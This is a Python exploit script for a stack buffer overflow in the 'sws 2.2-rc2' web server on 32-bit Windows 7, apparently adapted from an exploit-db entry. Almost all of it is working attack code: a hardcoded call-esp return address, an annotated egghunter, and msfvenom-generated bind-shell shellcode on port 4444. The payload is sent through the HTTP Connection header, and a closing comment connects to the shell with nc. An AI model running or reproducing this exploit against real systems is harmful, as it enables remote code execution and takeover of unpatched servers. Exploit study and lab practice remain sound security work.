#!/usr/bin/python

'''
 sws 2.2-rc2
 win 7 enterprise sp1 32bit
 https://www.exploit-db.com/exploits/19937

'''
     
import socket

#TO BE CONFIGURED     
HOST = '192.168.1.101'
PORT = 80


#embedded program library NO ASLR see below
#0x6fc66d71 : call esp |  {PAGE_EXECUTE_READ} [libstdc++-6.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- .\sws\libstdc++-6.dll
#0x6fc8e251 : call esp |  {PAGE_EXECUTE_READ} [libstdc++-6.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- .\sws\libstdc++-6.dll
#TO CHECK
ret_addr = "\x51\xe2\xc8\x6f"

#egg tag
mark = "\x72\x30\x30\x74" #t00r

# The egghunter
egghunter  = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8" + mark + "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

'''
ntaccesscheckandauditalarm technique
egghunter disass

 or dx,0x0fff       ; get last address in page
 inc edx            ; acts as a counter
                    ; (increments the value in EDX)
 push edx           ; pushes edx value to the  stack
                    ; (saves our current address on the stack)
 push byte +0x2     ; push 0x2 for NtAccessCheckAndAuditAlarm
                    ; or 0x43 for NtDisplayString to stack
 pop eax            ; pop 0x2 or 0x43 into eax
                    ; so it can be used as parameter
                    ; to syscall - see next
 int 0x2e           ; tell the kernel i want a do a
                    ; syscall using previous register
 cmp al,0x5         ; check if access violation occurs
                    ;(0xc0000005== ACCESS_VIOLATION) 5
 pop edx            ; restore edx
 jz  0x00           ; jmp back to start dx 0x0fffff
 mov eax,0xmark*2   ; this is the tag, repeat twice (egg)
 mov edi,edx        ; set edi to our pointer
 scasd              ; compare for status
 jnz 0x5            ; (back to inc edx) check egg found or not
 scasd              ; when egg has been found
 jnz 0x5            ; (jump back to "inc edx")
                    ; if only the first egg was found
 jmp edi            ; edi points to begin of the shellcode

'''

#shellcode generated with: msfvenom -p windows/shell_bind_tcp -b '\x00\x0a\x0d' -f py
#355 bytes
#default port 4444

buf =   mark + mark
buf += "\xbd\x3e\xa7\x9c\x21\xda\xd8\xd9\x74\x24\xf4\x5b\x2b"
buf += "\xc9\xb1\x53\x31\x6b\x12\x03\x6b\x12\x83\xd5\x5b\x7e"
buf += "\xd4\xd5\x4c\xfd\x17\x25\x8d\x62\x91\xc0\xbc\xa2\xc5"
buf += "\x81\xef\x12\x8d\xc7\x03\xd8\xc3\xf3\x90\xac\xcb\xf4"
buf += "\x11\x1a\x2a\x3b\xa1\x37\x0e\x5a\x21\x4a\x43\xbc\x18"
buf += "\x85\x96\xbd\x5d\xf8\x5b\xef\x36\x76\xc9\x1f\x32\xc2"
buf += "\xd2\x94\x08\xc2\x52\x49\xd8\xe5\x73\xdc\x52\xbc\x53"
buf += "\xdf\xb7\xb4\xdd\xc7\xd4\xf1\x94\x7c\x2e\x8d\x26\x54"
buf += "\x7e\x6e\x84\x99\x4e\x9d\xd4\xde\x69\x7e\xa3\x16\x8a"
buf += "\x03\xb4\xed\xf0\xdf\x31\xf5\x53\xab\xe2\xd1\x62\x78"
buf += "\x74\x92\x69\x35\xf2\xfc\x6d\xc8\xd7\x77\x89\x41\xd6"
buf += "\x57\x1b\x11\xfd\x73\x47\xc1\x9c\x22\x2d\xa4\xa1\x34"
buf += "\x8e\x19\x04\x3f\x23\x4d\x35\x62\x2c\xa2\x74\x9c\xac"
buf += "\xac\x0f\xef\x9e\x73\xa4\x67\x93\xfc\x62\x70\xd4\xd6"
buf += "\xd3\xee\x2b\xd9\x23\x27\xe8\x8d\x73\x5f\xd9\xad\x1f"
buf += "\x9f\xe6\x7b\xb5\x97\x41\xd4\xa8\x5a\x31\x84\x6c\xf4"
buf += "\xda\xce\x62\x2b\xfa\xf0\xa8\x44\x93\x0c\x53\x7b\x38"
buf += "\x98\xb5\x11\xd0\xcc\x6e\x8d\x12\x2b\xa7\x2a\x6c\x19"
buf += "\x9f\xdc\x25\x4b\x18\xe3\xb5\x59\x0e\x73\x3e\x8e\x8a"
buf += "\x62\x41\x9b\xba\xf3\xd6\x51\x2b\xb6\x47\x65\x66\x20"
buf += "\xeb\xf4\xed\xb0\x62\xe5\xb9\xe7\x23\xdb\xb3\x6d\xde"
buf += "\x42\x6a\x93\x23\x12\x55\x17\xf8\xe7\x58\x96\x8d\x5c"
buf += "\x7f\x88\x4b\x5c\x3b\xfc\x03\x0b\x95\xaa\xe5\xe5\x57"
buf += "\x04\xbc\x5a\x3e\xc0\x39\x91\x81\x96\x45\xfc\x77\x76"
buf += "\xf7\xa9\xc1\x89\x38\x3e\xc6\xf2\x24\xde\x29\x29\xed"
buf += "\xee\x63\x73\x44\x67\x2a\xe6\xd4\xea\xcd\xdd\x1b\x13"
buf += "\x4e\xd7\xe3\xe0\x4e\x92\xe6\xad\xc8\x4f\x9b\xbe\xbc"
buf += "\x6f\x08\xbe\x94"
shellcode = buf

#we must make space to accommodate the shellcode
junk = "\x90" * (2048 - len(shellcode)) # mark*2 len included in the sc
nops = "\x90" * 16 			# padding nops sliding to the egg

# Overflow EIP with a buffer made with NOPs + the shellcodewe then
# jump to ESP (ret_addr) that contains the egghunter, that will start to search for the double egg tag in memory (EDI is used as pointer)
# when it's found the program's flow is redirect to the shellcode
exploit = junk + shellcode + ret_addr + nops +  egghunter
#exploit = "\x90" * 2048 + ret_addr + nops + shellcode

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))
sock.send("GET / HTTP/1.0\r\nHost: %s\r\nConnection: %s\r\n\r\n" % (HOST, exploit))
sock.close()
    
print "Len buffer sent: " + str(len(exploit)) 
#try to get the shell: nc HOST 4444     
